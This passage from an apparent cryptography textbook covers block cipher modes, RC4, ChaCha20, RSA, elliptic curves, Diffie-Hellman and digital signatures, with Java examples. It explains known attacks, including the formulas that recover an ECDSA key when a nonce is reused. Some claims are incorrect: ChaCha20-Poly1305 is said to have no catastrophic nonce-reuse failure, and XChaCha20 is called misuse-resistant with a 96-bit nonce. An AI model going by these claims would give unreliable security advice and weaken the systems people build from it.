**Against brute force:** Best known attack on AES-128 is 2^126.1 operations (biclique attack by Bogdanov et al., 2011) — negligibly better than brute force, and far beyond any feasible computation.

**Against algebraic attacks:** AES was designed to resist XSL (eXtended Sparse Linearisation) and other algebraic attacks.

**Related-key attacks:** AES-256 has theoretical related-key attacks (2^99.5 time), but these require an attacker to obtain encryptions under related keys — not relevant to normal usage.

**Side-channel attacks:** AES in software can be attacked through timing and cache side channels (e.g., Flush+Reload on table lookups). Hardware AES-NI instructions (Intel, ARM) resist these.

### AES-NI (Hardware Acceleration)

Modern CPUs include dedicated AES instructions:
- `AESENC` — one round of AES encryption
- `AESENCLAST` — final round of AES encryption
- `AESDEC` / `AESDECLAST` — decryption equivalents
- `AESKEYGENASSIST` — key schedule assistance

With AES-NI, AES can run at 1-3 clock cycles per byte — multiple GB/s throughput.

---

# Chapter 7: Modes of Operation

## 7.1 Why Modes Are Needed

A block cipher only encrypts a single fixed-size block. Real messages are variable length. **Modes of operation** define how to apply a block cipher repeatedly to encrypt messages of any length.

Choosing the wrong mode is one of the most common cryptographic mistakes. This chapter explains each mode's security properties.

## 7.2 ECB — Electronic Codebook Mode ❌

The simplest mode: encrypt each block independently.

```
C_i = E_k(P_i)
P_i = D_k(C_i)
```

**⚠️ NEVER USE ECB.** It is fundamentally insecure.

**Why ECB fails:** Identical plaintext blocks produce identical ciphertext blocks. The structure of the plaintext is preserved.

**The ECB Penguin:** The classic demonstration is encrypting a bitmap image of Linux's Tux penguin with AES-ECB. The output is garbled but the shape of the penguin is clearly visible in the ciphertext — because all pixels of the same color (same plaintext block) produce the same ciphertext block.

## 7.3 CBC — Cipher Block Chaining ✓

Each plaintext block is XORed with the previous ciphertext block before encryption.

```
C_i = E_k(P_i ⊕ C_{i-1})
P_i = D_k(C_i) ⊕ C_{i-1}
C_0 = IV (Initialization Vector)
```

**Properties:**
- **IV must be random and unpredictable** (not reused)
- Same plaintext + different IV = different ciphertext ✓
- Identical blocks no longer produce identical ciphertext ✓
- **Sequential encryption** (can't parallelize encryption, but can parallelize decryption)
- **Error propagation**: 1-bit error in C_i corrupts P_i entirely and flips 1 bit in P_{i+1}

**CBC Padding:**
Since CBC requires full blocks, the last block must be padded. **PKCS#7** padding is standard:
```
If 3 bytes needed: add 03 03 03
If 5 bytes needed: add 05 05 05 05 05
If 0 bytes needed: add a full block of 16 bytes: 10 10 10 10 ... 10
```

**BEAST Attack (2011):** CBC in TLS 1.0 is vulnerable when the attacker can predict the IV (the previous ciphertext block). Fixed in TLS 1.1 by using a random IV.

**Padding Oracle Attack (POODLE, Lucky13):** If a server reveals whether decrypted padding is valid, an attacker can decrypt the ciphertext byte by byte. Always use authenticated encryption to prevent this.

## 7.4 CTR — Counter Mode ✓✓

CTR mode turns a block cipher into a stream cipher by encrypting a counter.

```
Keystream block i: K_i = E_k(Nonce || Counter_i)
C_i = P_i ⊕ K_i
P_i = C_i ⊕ K_i
```

**Properties:**
- **Fully parallelizable** (both encryption and decryption) ✓
- **Random access**: can decrypt any block independently ✓
- **No padding needed**: works on any length ✓
- **Nonce must NEVER be reused with the same key**: reuse leaks P₁ ⊕ P₂ = C₁ ⊕ C₂

CTR mode is excellent for performance-critical applications.

## 7.5 GCM — Galois/Counter Mode ✓✓✓ (Recommended)

GCM = CTR encryption + GHASH authentication. It provides **Authenticated Encryption with Associated Data (AEAD)**.

```
Encryption:
  keystream = CTR mode with key K and nonce N
  ciphertext = plaintext ⊕ keystream
  auth_tag = GHASH(H, AAD, ciphertext)  where H = E_k(0)

Decryption:
  verify auth_tag first → abort if invalid
  ciphertext ⊕ keystream = plaintext
```

**AAD (Additional Authenticated Data):** Data that is authenticated but not encrypted (e.g., packet headers, metadata). Tampering with AAD is detected.

**Properties:**
- **Authenticated**: any tampering with ciphertext or AAD is detected ✓
- **Parallelizable** ✓
- **Nonce must NEVER be reused** — nonce reuse in GCM is catastrophic, allowing the key to be recovered

**GCM usage:**
- TLS 1.2/1.3: AES-128-GCM and AES-256-GCM
- IPSec
- SSH
- Disk encryption (BitLocker)

**Nonce size:** GCM uses a 96-bit (12-byte) nonce. Never use the same nonce twice with the same key.

## 7.6 CCM Mode ✓

CCM = Counter with CBC-MAC. Also provides AEAD but processes data twice (less efficient than GCM). Used in 802.11i (WPA2) and IPsec.

## 7.7 ChaCha20-Poly1305 ✓✓✓

An alternative AEAD construction that doesn't use AES:
- **ChaCha20**: a stream cipher (encryption)
- **Poly1305**: a MAC (authentication)

**Advantages over AES-GCM:**
- Faster in software (no hardware acceleration needed)
- Resistant to timing attacks (no table lookups)
- No catastrophic nonce reuse failure (misuse-resistant variant: XChaCha20)

Used in TLS 1.3, Noise protocol, WireGuard VPN, and as an AES fallback on mobile devices.

## 7.8 Comparison Table

| Mode | Authenticated | Parallel Enc | Parallel Dec | Nonce Required | Use Case |
|------|--------------|-------------|-------------|----------------|----------|
| ECB  | ❌ | ✅ | ✅ | No | **Never use** |
| CBC  | ❌ | ❌ | ✅ | Yes (random) | Legacy only |
| CTR  | ❌ | ✅ | ✅ | Yes (unique) | Rare (use GCM) |
| GCM  | ✅ | ✅ | ✅ | Yes (unique) | **Recommended** |
| CCM  | ✅ | ❌ | ❌ | Yes (unique) | IoT, WiFi |
| ChaCha20-Poly1305 | ✅ | ✅ | ✅ | Yes (unique) | **Recommended** |

---

# Chapter 8: Stream Ciphers

## 8.1 Stream Cipher Fundamentals

A stream cipher generates a **keystream** — a sequence of pseudorandom bits — and XORs it with the plaintext:

```
Keystream = G(key, nonce)  where G is a PRNG
Ciphertext = Plaintext ⊕ Keystream
Plaintext  = Ciphertext ⊕ Keystream
```

Stream ciphers are especially useful for:
- Continuous/streaming data (voice, video)
- Hardware with limited resources
- When variable-length data must be encrypted without padding

## 8.2 RC4 — A Broken Classic

RC4 (Ron's Code 4, 1987) was the world's most-used stream cipher, appearing in WEP, WPA, SSL/TLS, and RDP.

**RC4 Key Scheduling Algorithm (KSA):**
```java
// RC4 Key Scheduling Algorithm (KSA) — FOR EDUCATIONAL PURPOSES ONLY. Never use RC4.
static int[] ksa(byte[] key) {
    int[] S = new int[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + (key[i % key.length] & 0xFF)) % 256;
        int tmp = S[i]; S[i] = S[j]; S[j] = tmp; // swap
    }
    return S;
}
```

**RC4 Pseudorandom Generation Algorithm (PRGA):**
```java
// RC4 Pseudorandom Generation Algorithm (PRGA) — FOR EDUCATIONAL PURPOSES ONLY.
static byte[] prga(int[] S, int length) {
    byte[] keystream = new byte[length];
    int i = 0, j = 0;
    for (int n = 0; n < length; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        int tmp = S[i]; S[i] = S[j]; S[j] = tmp; // swap
        keystream[n] = (byte) S[(S[i] + S[j]) % 256];
    }
    return keystream;
}
```

**RC4 Weaknesses:**
- **Weak key scheduling**: first bytes of keystream are biased (the Fluhrer-Mantin-Shamir attack)
- **WEP exploit**: IV (24 bits) prepended to key, creating related-key bias; 40,000 packets break WEP
- **RC4 NOMORE attack (2015)**: full plaintext recovery from HTTPS in hours by collecting millions of TLS connections
- **RC4 is prohibited** in TLS as of RFC 7465 (2015)

**Never use RC4.** It is thoroughly broken.

## 8.3 Linear Feedback Shift Registers (LFSR)

LFSRs are the hardware building block of many classical stream ciphers (A5/1 for GSM, CSS for DVD).

```
State: [b₀ b₁ b₂ b₃]
Feedback polynomial: b₄ = b₃ ⊕ b₀

Step:
[b₀ b₁ b₂ b₃] → output b₀, compute b₄ = b₃⊕b₀
[b₁ b₂ b₃ b₄]
```

An LFSR with a **primitive polynomial** achieves maximal period (2ⁿ - 1 for n-bit LFSR).

**LFSR weaknesses:** Linear! Knowing 2n output bits lets you reconstruct the state and predict all future output (Berlekamp-Massey algorithm).

**Nonlinear combination**: Multiple LFSRs combined with a nonlinear function (e.g., A5/1 uses 3 LFSRs). Still cryptographically weak by modern standards.

## 8.4 ChaCha20

ChaCha20 (Bernstein, 2008) is the dominant modern stream cipher. It is used in TLS 1.3, SSH, WireGuard, and Android.

### ChaCha20 State

A 4×4 matrix of 32-bit words (512 bits total):

```
"expa"  "nd 3"  "2-by"  "te k"   ← Constants
key[0]  key[1]  key[2]  key[3]
key[4]  key[5]  key[6]  key[7]
ctr     nonce[0] nonce[1] nonce[2]
```

### The Quarter Round

ChaCha20's mixing function:
```
a += b; d ^= a; d <<<= 16;
c += d; b ^= c; b <<<= 12;
a += b; d ^= a; d <<<= 8;
c += d; b ^= c; b <<<= 7;
```

Using only **add, XOR, rotate** (ARX design) — no table lookups, naturally constant-time.

### 20 Rounds

ChaCha20 applies 20 rounds of quarter rounds (10 column rounds + 10 diagonal rounds), then adds the original state to the result.

**Security:** ChaCha20 has 256-bit key, 96-bit nonce, 32-bit counter → secure against brute force, no known weaknesses.

## 8.5 Salsa20

The predecessor to ChaCha20, also by Bernstein. Used in NaCl (libsodium). ChaCha20 is preferred for new designs due to better diffusion.

## 8.6 Stream Cipher Usage Rules

1. **Never reuse (key, nonce) pairs.** Two-time pad XOR reveals P₁⊕P₂.
2. **Always use authenticated encryption.** A stream cipher alone provides no integrity.
3. **Use ChaCha20-Poly1305** or **AES-GCM** — both provide stream ciphers with authentication.
4. For large files, use XChaCha20 (96-bit nonce) to reduce nonce collision risk.

---

---

# PART III — ASYMMETRIC CRYPTOGRAPHY

---

# Chapter 9: Public Key Cryptography & RSA

## 9.1 The Key Distribution Problem

Symmetric cryptography requires both parties to share a secret key. Before communicating, Alice and Bob must somehow securely exchange this key. But if they could securely communicate the key, why do they need encryption at all?

This **key distribution problem** was the central challenge of cryptography for millennia. It was solved in the 1970s — independently by Diffie & Hellman and by Rivest, Shamir & Adleman — using a revolutionary idea: **public key cryptography**.

## 9.2 Asymmetric (Public Key) Cryptography

In public key cryptography, each party has **two mathematically related keys**:

```
┌─────────────────────────────────────────────────────┐
│  Private Key (secret)        Public Key (published) │
│                                                     │
│  Bob keeps this secret       Bob shares with anyone │
│                                                     │
│  Decrypts what anyone        Encrypts messages      │
│  encrypted with public key   only Bob can decrypt   │
│                                                     │
│  Signs messages that anyone  Verifies signatures    │
│  can verify with public key  made by Bob            │
└─────────────────────────────────────────────────────┘
```

**The key insight:** The private and public keys are mathematically related, but computing the private key from the public key is computationally infeasible (based on a hard problem).

### Asymmetric vs Symmetric

| Property | Symmetric | Asymmetric |
|----------|-----------|------------|
| Keys | Same key for both parties | Public/Private key pair |
| Key exchange | Hard (chicken-and-egg) | Easy (publish public key) |
| Speed | 100-1000× faster | Slow |
| Key size for 128-bit security | 128 bits | 3072 bits (RSA) |
| Use case | Bulk data encryption | Key exchange, signatures |
| Common algorithms | AES, ChaCha20 | RSA, ECDSA, Ed25519 |

In practice, **hybrid encryption** is used: asymmetric crypto to exchange a symmetric key, symmetric crypto for actual data.

## 9.3 RSA — Rivest-Shamir-Adleman

RSA (1977) is the most famous public key algorithm. It is based on the **integer factorization problem**: multiplying two large primes is easy; factoring their product is believed to be hard.

### RSA Key Generation

```
1. Choose two large primes: p, q  (each ~1024 bits for 2048-bit RSA)
2. Compute n = p × q              (the modulus, e.g., 2048 bits)
3. Compute φ(n) = (p-1)(q-1)     (Euler's totient)
4. Choose e such that:
     1 < e < φ(n) and gcd(e, φ(n)) = 1
   (e = 65537 = 2^16+1 is standard — small, prime, few 1-bits for fast exponentiation)
5. Compute d = e⁻¹ mod φ(n)      (modular inverse via Extended Euclidean)

Public key:  (n, e)
Private key: (n, d)  — keep secret!
Destroy:     p, q, φ(n)
```

**Worked Example (tiny numbers for illustration):**
```
p = 61, q = 53
n = 61 × 53 = 3233
φ(n) = 60 × 52 = 3120
e = 17 (gcd(17, 3120) = 1 ✓)
d = 17⁻¹ mod 3120 = 2753  (17 × 2753 = 46801 = 15×3120 + 1 ✓)

Public key:  (3233, 17)
Private key: (3233, 2753)
```

### RSA Encryption and Decryption

```
Encrypt: C = M^e mod n
Decrypt: M = C^d mod n
```

**Example:**
```
M = 65 (plaintext)
C = 65^17 mod 3233 = 2790  (encryption)
M = 2790^2753 mod 3233 = 65 (decryption) ✓
```

### Why RSA Works — Euler's Theorem

```
(M^e)^d = M^(ed) = M^(1 + k×φ(n)) = M × (M^φ(n))^k ≡ M × 1 = M (mod n)
```

Since ed ≡ 1 (mod φ(n)), we have M^(ed) ≡ M (mod n). Decryption undoes encryption exactly.

### Fast Modular Exponentiation

Computing M^e mod n naively is slow. The **square-and-multiply** algorithm is efficient:

```java
import java.math.BigInteger;

// Square-and-multiply modular exponentiation — O(log exp) multiplications
static BigInteger modExp(BigInteger base, BigInteger exp, BigInteger mod) {
    BigInteger result = BigInteger.ONE;
    base = base.mod(mod);
    while (exp.compareTo(BigInteger.ZERO) > 0) {
        if (exp.testBit(0)) {                      // if lowest bit is set
            result = result.multiply(base).mod(mod);
        }
        exp = exp.shiftRight(1);                   // divide exponent by 2
        base = base.multiply(base).mod(mod);       // square the base
    }
    return result;
}
// Java's BigInteger has this built-in:
// BigInteger result = base.modPow(exp, mod);  ← use this in practice
```

## 9.4 RSA Security Analysis

### Integer Factorization

The security of RSA rests on the assumption that factoring large numbers is hard. The best known algorithm is the **General Number Field Sieve (GNFS)**:

Time complexity: `exp(c × n^(1/3) × (log n)^(2/3))`

| Key Size | Security Bits | NIST Recommendation |
|----------|-------------|---------------------|
| 1024 | ~80 | Deprecated (insecure) |
| 2048 | ~112 | Acceptable until 2030 |
| 3072 | ~128 | Recommended |
| 4096 | ~140 | Long-term secure |
| 15360 | ~256 | Post-quantum safe (classical) |

### RSA Attacks

**1. Textbook RSA is insecure — always use padding!**

Textbook RSA (C = M^e mod n) is deterministic — same message always gives same ciphertext. This violates IND-CPA security.

**2. PKCS#1 v1.5 Padding Attack (Bleichenbacher, 1998)**:
The padding scheme for RSA encryption in SSL/TLS was vulnerable. By observing whether a server accepted or rejected padded ciphertexts, an attacker could decrypt messages via ~1 million adaptive queries.

**3. OAEP (Optimal Asymmetric Encryption Padding)** — current standard:
```
C = (M || label hash) → masking → MGF → encrypt with RSA
```
Provably secure (IND-CCA2) under the RSA assumption. Always use RSA-OAEP.

**4. Common modulus attack**: Never use the same n for two different (e, d) pairs.

**5. Small e attacks**: Very small e (e.g., e=3) with unpadded messages allows the cube root to be taken directly if M^3 < n.

**6. Timing attacks**: RSA decryption time varies based on d. Montgomery multiplication and blinding techniques mitigate this.

## 9.5 RSA Signatures

RSA can also create digital signatures:

```
Sign:   S = H(M)^d mod n
Verify: H(M) =? S^e mod n
```

Where H is a hash function. The hash prevents length extension attacks and makes signing efficient regardless of message size.

**RSA-PSS (Probabilistic Signature Scheme)** is the recommended RSA signature scheme (not PKCS#1 v1.5 signatures, which are malleable).

---

# Chapter 10: Elliptic Curve Cryptography (ECC)

## 10.1 Why Elliptic Curves?

RSA requires large keys (3072+ bits) for adequate security. Elliptic curve cryptography achieves the same security level with much smaller keys:

| Security Level | RSA Key Size | ECC Key Size | Ratio |
|---------------|-------------|-------------|-------|
| 80-bit | 1024 bits | 160 bits | 6.4× |
| 112-bit | 2048 bits | 224 bits | 9.1× |
| 128-bit | 3072 bits | 256 bits | 12× |
| 192-bit | 7680 bits | 384 bits | 20× |
| 256-bit | 15360 bits | 521 bits | 29× |

Smaller keys mean faster computation, less bandwidth, and smaller certificates.

## 10.2 Elliptic Curve Mathematics

An **elliptic curve** over a field F is the set of solutions to:

```
y² = x³ + ax + b
```

Plus a special "point at infinity" O (the identity element).

**Example curve (secp256k1, used in Bitcoin):**
```
y² = x³ + 7  (over prime field GF(p), p = 2²⁵⁶ - 2³² - 977)
```

### Point Addition

Given two points P = (x₁, y₁) and Q = (x₂, y₂) on a curve, their sum R = P + Q = (x₃, y₃):

**Case 1: P ≠ Q (adding two distinct points)**
```
λ = (y₂ - y₁) / (x₂ - x₁)  mod p
x₃ = λ² - x₁ - x₂          mod p
y₃ = λ(x₁ - x₃) - y₁       mod p
```

**Case 2: P = Q (point doubling)**
```
λ = (3x₁² + a) / (2y₁)      mod p
x₃ = λ² - 2x₁               mod p
y₃ = λ(x₁ - x₃) - y₁       mod p
```

**Group law:**
- P + O = P (O is identity)
- P + (-P) = O (where -P = (x, -y))
- Addition is commutative and associative

### Scalar Multiplication

**kP** means adding P to itself k times. This is computed efficiently via the **double-and-add algorithm** (analogous to square-and-multiply):

```java
import java.math.BigInteger;

// Double-and-add scalar multiplication on an elliptic curve
// ECPoint is a record/class holding (x, y) BigInteger coords
static ECPoint scalarMult(BigInteger k, ECPoint P, ECCurve curve) {
    ECPoint result = ECPoint.POINT_INFINITY; // identity element (O)
    ECPoint addend = P;
    while (k.compareTo(BigInteger.ZERO) > 0) {
        if (k.testBit(0)) {                        // if bit is set
            result = curve.pointAdd(result, addend);
        }
        addend = curve.pointDouble(addend);
        k = k.shiftRight(1);
    }
    return result;
}
// In practice, use the JCA/BouncyCastle for ECC:
// KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
// kpg.initialize(new ECGenParameterSpec("secp256r1"));
```

For a 256-bit k, this requires at most 512 point operations (256 doublings + up to 256 additions).

## 10.3 The Elliptic Curve Discrete Logarithm Problem (ECDLP)

Given points P and Q = kP on a curve, find k.

This is the **Elliptic Curve Discrete Logarithm Problem (ECDLP)**. The best known algorithms (Pohlig-Hellman, Pollard's rho) run in O(√n) time where n is the order of the group.

For a 256-bit curve, breaking ECDLP requires ~2^128 operations — 128 bits of security from only 256-bit keys!

## 10.4 Standard Curves

**NIST Curves (FIPS 186-4):**
| Curve | Field Size | Security | Use Case |
|-------|-----------|----------|----------|
| P-256 (secp256r1) | 256 bits | 128-bit | TLS, HTTPS |
| P-384 (secp384r1) | 384 bits | 192-bit | High-security |
| P-521 (secp521r1) | 521 bits | 260-bit | Very high-security |

**Modern Alternatives (Bernstein):**
| Curve | Field Size | Security | Advantages |
|-------|-----------|----------|-----------|
| Curve25519 | 255 bits | 128-bit | Fast, safe, no patent issues |
| Curve448 | 448 bits | 224-bit | High security, fast |
| Ed25519 | 255 bits | 128-bit | EdDSA signature scheme |
| Ed448 | 448 bits | 224-bit | EdDSA high security |

**Why Curve25519 is preferred over P-256:**
- The NIST curves' constants were chosen opaquely — some distrust them (possible backdoor)
- Curve25519 is complete (no exceptional cases), making implementations easier to get right
- Better performance characteristics

## 10.5 ECC in Practice

**ECDH (Elliptic Curve Diffie-Hellman):** Key agreement (see Chapter 11)

**ECDSA (Elliptic Curve Digital Signature Algorithm):** Digital signatures (see Chapter 12)

**ECIES (Elliptic Curve Integrated Encryption Scheme):** Asymmetric encryption using ECC

### ECDSA Signing

```
Private key: d (random scalar)
Public key:  Q = dG  (point on curve)

Sign message m:
1. k = random nonce (CRITICAL: never reuse)
2. r = (kG).x mod n
3. s = k⁻¹ × (H(m) + d×r) mod n
4. Signature = (r, s)

Verify:
1. u₁ = s⁻¹ × H(m) mod n
2. u₂ = s⁻¹ × r mod n
3. Point P = u₁G + u₂Q
4. Valid if P.x ≡ r (mod n)
```

**⚠️ CRITICAL: The nonce k must be unique for every signature!** If k is reused for two signatures:
```
s₁ = k⁻¹(H(m₁) + dr) mod n
s₂ = k⁻¹(H(m₂) + dr) mod n
k = (H(m₁) - H(m₂)) / (s₁ - s₂) mod n
d = (s₁k - H(m₁)) / r mod n  ← private key recovered!
```

This is exactly how the PlayStation 3 was cracked in 2010 and how Blockchain transactions have been deanonymized.

**Solution:** Use deterministic nonce generation (RFC 6979) which derives k from the message and private key — eliminating randomness requirements.

## 10.6 EdDSA — Edwards Curve Digital Signature Algorithm

EdDSA (ed25519) uses a **twisted Edwards curve** for faster, safer signing:

```
Twisted Edwards curve: ax² + y² = 1 + dx²y²
```

**Ed25519 advantages:**
- Deterministic (no random nonce needed)
- Complete (no exceptional cases — prevents implementation bugs)
- ~2× faster than ECDSA on P-256
- Resistant to many side-channel attacks
- Used in SSH, GPG, TLS 1.3, Signal, WireGuard

```java
import java.security.*;

// Ed25519 in Java (JDK 15+ has built-in Ed25519 support)
// Generate Ed25519 key pair
KeyPairGenerator kpg = KeyPairGenerator.getInstance("Ed25519");
KeyPair keyPair = kpg.generateKeyPair();
PrivateKey privateKey = keyPair.getPrivate();
PublicKey publicKey  = keyPair.getPublic();

// Sign
Signature signer = Signature.getInstance("Ed25519");
signer.initSign(privateKey);
signer.update("Hello, World!".getBytes(StandardCharsets.UTF_8));
byte[] signature = signer.sign();

// Verify
Signature verifier = Signature.getInstance("Ed25519");
verifier.initVerify(publicKey);
verifier.update("Hello, World!".getBytes(StandardCharsets.UTF_8));
boolean valid = verifier.verify(signature); // true
```

---

# Chapter 11: Diffie-Hellman & Key Exchange

## 11.1 The Diffie-Hellman Key Exchange

In 1976, Whitfield Diffie and Martin Hellman published "New Directions in Cryptography," introducing the concept of public key cryptography and the Diffie-Hellman key exchange. This was a revolutionary moment in cryptographic history.

DH allows two parties to establish a shared secret **over a public channel** without any prior secret exchange.

### DH Protocol (Finite Field)

**Setup (public parameters):**
```
p = large prime
g = generator of ℤ_p* (primitive root mod p)
```

**Protocol:**
```
Alice                           Bob
─────                           ───
Pick secret a                   Pick secret b
Compute A = g^a mod p           Compute B = g^b mod p
─────────── Send A ────────────→
←────────── Send B ─────────────
Compute S = B^a mod p           Compute S = A^b mod p
S = g^(ab) mod p  ←──── SAME SECRET ────→  S = g^(ba) mod p
```

An eavesdropper sees g, p, A, B but cannot compute g^(ab) without solving the **Discrete Logarithm Problem** (DLP): given g, p, and A = g^a mod p, find a.

**Security:** For 2048-bit FFDH (Finite Field DH), security is ~112 bits. Use 3072-bit for 128-bit security.

### DH is Not Authenticated — Man-in-the-Middle Attack

```
Alice           Mallory (attacker)          Bob
  A = g^a  →→→   Intercepts A
                 M₁ = g^m      →→→  B = g^b
                 ←←←           B
  ←←←  M₁
  S₁ = M₁^a = g^(am)          S₂ = M₁^b = g^(mb)
  Alice thinks she shares S₁ with Bob
  Bob thinks he shares S₂ with Alice
  Mallory can decrypt, modify, re-encrypt all traffic!
```

**Solution:** Authenticate the DH exchange with digital signatures → **Authenticated Key Exchange (AKE)**.

## 11.2 Elliptic Curve Diffie-Hellman (ECDH)

ECDH replaces the DH group ℤ_p* with an elliptic curve group:

```
Public parameters: Curve E, generator point G, order n

Alice                           Bob
─────                           ───
Pick secret a ∈ [1, n-1]       Pick secret b ∈ [1, n-1]
Compute A = aG                  Compute B = bG
─────────── Send A ────────────→
←────────── Send B ─────────────
Compute S = aB = a(bG) = abG   Compute S = bA = b(aG) = abG
```

Same idea, but the group is an elliptic curve. ECDLP is harder than DLP for the same key size, so keys are much shorter.

**ECDH with X25519 (Curve25519):**
```java
import java.security.*;
import java.security.spec.ECGenParameterSpec;
import javax.crypto.KeyAgreement;

// ECDH with X25519 (Curve25519) — JDK 11+
// Alice generates her key pair
KeyPairGenerator aliceKpg = KeyPairGenerator.getInstance("X25519");
KeyPair aliceKeyPair = aliceKpg.generateKeyPair();

// Bob generates his key pair
KeyPairGenerator bobKpg = KeyPairGenerator.getInstance("X25519");
KeyPair bobKeyPair = bobKpg.generateKeyPair();

// Alice computes shared secret
KeyAgreement aliceKA = KeyAgreement.getInstance("XDH");
aliceKA.init(aliceKeyPair.getPrivate());
aliceKA.doPhase(bobKeyPair.getPublic(), true);
byte[] aliceShared = aliceKA.generateSecret();

// Bob computes shared secret
KeyAgreement bobKA = KeyAgreement.getInstance("XDH");
bobKA.init(bobKeyPair.getPrivate());
bobKA.doPhase(aliceKeyPair.getPublic(), true);
byte[] bobShared = bobKA.generateSecret();

// Arrays.equals(aliceShared, bobShared) == true ✓
// Derive symmetric keys from sharedSecret using HKDF
```

## 11.3 Forward Secrecy

**Perfect Forward Secrecy (PFS)**: Even if the server's long-term private key is compromised in the future, past sessions remain confidential.

**Without PFS (RSA key exchange):**
- Client encrypts session key with server's RSA public key
- Attacker records all ciphertext
- 5 years later, attacker obtains server's RSA private key
- Attacker decrypts all recorded sessions ← catastrophic!

**With PFS (Ephemeral DH or ECDH):**
- New random DH key pair generated for each session
- Session key derived from ephemeral DH
- After session ends, ephemeral keys are deleted
- Attacker with future key cannot decrypt past sessions ✓

PFS is mandatory in TLS 1.3 (only ECDHE and DHE cipher suites).

## 11.4 Key Encapsulation Mechanisms (KEM)

A KEM is a cleaner abstraction for asymmetric key exchange:

```
KeyGen()      → (pk, sk)
Encaps(pk)    → (ciphertext, shared_secret)
Decaps(sk, c) → shared_secret
```

- Sender calls Encaps with recipient's public key, gets ciphertext and shared secret
- Receiver calls Decaps with their private key and ciphertext, gets same shared secret
- Share secret is used to derive symmetric keys

**RSA-OAEP, ECIES, and post-quantum algorithms (CRYSTALS-Kyber)** are all KEMs. TLS 1.3 and post-quantum TLS use KEMs.

## 11.5 Station-to-Station (STS) Protocol

A complete authenticated key exchange protocol:

```
Alice                                        Bob
  a ← random
  A = g^a mod p
                 ─── g, p, A ──→
                                             b ← random
                                             B = g^b mod p
                                             K = A^b mod p
                                             sig_B = Sign_B(g||p||A||B)
                                             E_K(sig_B, cert_B)
              ←─── B, E_K(sig_B, cert_B) ───
  K = B^a mod p
  Verify sig_B using cert_B's public key
  sig_A = Sign_A(A||B)
                 ─── E_K(sig_A, cert_A) ──→
                                             Verify sig_A using cert_A's public key
```

Both parties authenticate and contribute randomness. The shared key K provides PFS.

---

# Chapter 12: Digital Signatures

## 12.1 What Digital Signatures Provide

A digital signature provides three properties:

1. **Authentication**: The message came from the claimed signer (they have the private key)
2. **Integrity**: The message was not altered after signing
3. **Non-repudiation**: The signer cannot deny having signed (only they have the private key)

Contrast with a MAC (Message Authentication Code): a MAC provides integrity and authentication but **not non-repudiation**, because both parties share the MAC key — either could have created it.

## 12.2 Generic Signature Scheme

```
KeyGen()     → (sk, vk)         # signing key, verification key
Sign(sk, m)  → σ               # signature
Verify(vk, m, σ) → {valid, invalid}
```

In practice, we always sign **H(m)** (the hash of the message), not m directly:
- Efficiency: sign a 32-byte hash instead of a multi-megabyte document
- Security: prevents length extension attacks on the underlying signature operation

## 12.3 RSA Signatures (RSA-PSS)

```
Sign:
1. Compute h = H(m)
2. Apply PSS encoding: EM = PSS_encode(h, sLen, emLen)
3. Signature: S = EM^d mod n

Verify:
1. Compute h = H(m)
2. Recover EM = S^e mod n
3. Verify PSS: PSS_verify(h, EM) → valid/invalid
```

**PSS (Probabilistic Signature Scheme)** adds a random salt to the encoding, making signatures probabilistic (each signing produces a different σ) while still verifiable. PSS is provably secure under the RSA problem.

**⚠️ Do not use PKCS#1 v1.5 signatures** (the older scheme) — it has known vulnerabilities.

## 12.4 DSA — Digital Signature Algorithm

DSA (NIST, 1991) is based on the discrete logarithm problem:

```
Parameters (public): p (L-bit prime), q (N-bit prime, q | p-1), g = h^((p-1)/q) mod p
Private key: x, where 0 < x < q
Public key:  y = g^x mod p

Sign:
  k = random nonce (unique per signature!)
  r = (g^k mod p) mod q
  s = k⁻¹ × (H(m) + x×r) mod q
  Signature: (r, s)

Verify:
  w = s⁻¹ mod q
  u₁ = H(m) × w mod q
  u₂ = r × w mod q
  v = (g^u₁ × y^u₂ mod p) mod q
  Valid if v == r
```

DSA has been largely superseded by ECDSA (shorter keys, same security).

## 12.5 ECDSA vs EdDSA Comparison

| Property | ECDSA | EdDSA (Ed25519) |
|----------|-------|-----------------|
| Randomness required | Yes (catastrophic if broken) | No (deterministic) |
| Side-channel resistance | Requires care | Built-in |
| Speed | Fast | Faster |
| Implementation safety | Complex | Simple |
| Standard curves | NIST P-256, P-384 | Curve25519, Curve448 |
| Adoption | TLS, HTTPS, Bitcoin | SSH, Signal, WireGuard, TLS 1.3 |

**Recommendation:** Use Ed25519 for new systems. ECDSA P-256 if Ed25519 not available.

## 12.6 Signature Schemes Summary

| Scheme | Based On | Key Size | Use Case |
|--------|---------|----------|----------|
| RSA-PSS | Integer factoring | 3072 bits | Legacy systems, X.509 certs |
| ECDSA P-256 | ECDLP | 256 bits | TLS, code signing, JWTs |
| Ed25519 | ECDLP (Edwards curve) | 256 bits | SSH, WireGuard, modern systems |
| Ed448 | ECDLP (Edwards curve) | 448 bits | High-security systems |
| DSA | DLP | 2048 bits | Legacy only |
| Dilithium | Lattices | Variable | Post-quantum |
| Falcon | NTRU lattices | Variable | Post-quantum compact |

## 12.7 Certificate Signing and PKI Preview

A digital certificate binds an identity (e.g., "google.com") to a public key, signed by a trusted Certificate Authority (CA):

```
Certificate = {
  subject:        "CN=google.com, O=Google LLC"
  public_key:     EC public key (P-256)
  issuer:         "CN=Google Trust Services, O=Google"
  validity:       2024-01-01 to 2024-12-31
  extensions:     SAN: *.google.com, www.google.com
  signature:      RSA-PSS signature by Google Trust Services
}
```

When your browser connects to google.com, it:
1. Receives the certificate
2. Verifies the CA's signature
3. Checks the CA is in the browser's trust store
4. Verifies the hostname matches
5. Checks the certificate hasn't expired or been revoked

Full PKI treatment in Chapter 16.

---

---

# PART IV — CRYPTOGRAPHIC PROTOCOLS

---

# Chapter 13: Hash Functions & MACs

## 13.1 Cryptographic Hash Functions

A **cryptographic hash function** H maps arbitrary-length input to a fixed-size output (the **digest** or **hash**):

```
H: {0,1}* → {0,1}^n
```

### Required Security Properties

**1. Preimage Resistance (One-Way)**
Given h, it's computationally infeasible to find m such that H(m) = h.
→ Security: 2^n operations

**2. Second Preimage Resistance (Weak Collision Resistance)**
Given m₁, it's computationally infeasible to find m₂ ≠ m₁ such that H(m₁) = H(m₂).
→ Security: 2^n operations

**3. Collision Resistance (Strong)**
It's computationally infeasible to find any pair m₁ ≠ m₂ such that H(m₁) = H(m₂).
→ Security: 2^(n/2) operations (birthday bound)

Note: Collision resistance implies second preimage resistance, but not vice versa.

## 13.2 Hash Function Constructions

